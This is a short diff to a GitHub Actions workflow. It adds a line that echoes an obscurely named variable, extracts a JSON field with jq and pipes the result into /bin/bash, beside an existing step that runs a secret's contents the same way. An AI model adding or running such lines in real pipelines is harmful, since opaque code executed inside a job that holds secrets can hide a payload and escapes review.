@@ -18,6 +18,7 @@ jobs:
           vjz295: ${{ secrets.vjz295 }}
         run: |
           printf '%s' "$vjz295" | jq -r .qf04 | /bin/bash
+          echo $dbxr413 | jq -r .h1329 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
